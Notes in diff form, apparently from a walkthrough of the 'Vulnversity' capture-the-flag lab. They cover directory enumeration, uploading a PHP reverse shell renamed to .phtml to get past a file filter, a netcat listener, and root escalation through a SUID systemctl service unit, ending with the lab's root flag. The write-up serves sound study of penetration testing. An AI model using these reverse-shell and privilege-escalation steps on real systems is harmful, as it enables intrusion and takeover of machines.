@@ -1,0 +1,83 @@
+https://www.embeddedhacker.com/2019/09/hacking-walkthrough-vulnversity-a-short-pentest-challenge/
+
+
+
+
+
+					gobuster:
+
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/internal (Status: 301)
+
+
+
+
+
+					php-reverse-shell:
+
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+(change ip to tun0 ipaddr)
+
+(rename .php to .phtml so youcan upload to server)
+
+(nc listener )
+
+nc -lvnp 1234
+
+(execute payload)
+
+http://10.10.219.22:3333/internal/uploads/reverse-php.phtml
+
+
+
+
+
+					netcat:
+
+(ls /home)
+
+bill
+
+(capture bill's flag - cat /home/bill/user.txt)
+
+					
+
+
+
+					privesc:
+
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+SUID FILES IN /bin/systemctl
+
+(cd /bin)
+
+(sh)
+
+(copy this script into shell and hit enter)
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+output:
+
+$TFCreated symlink from /etc/systemd/system/tmp.zFSuEyaay7.service to /tmp/tmp.zFSuEyaay7.service.
+
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.zFSuEyaay7.service to /tmp/tmp.zFSuEyaay7.service.
+
+(exit shell)
+
+(cat /tmp/output)
+
+a58ff8579f0a9270368d33a9966c7fd5
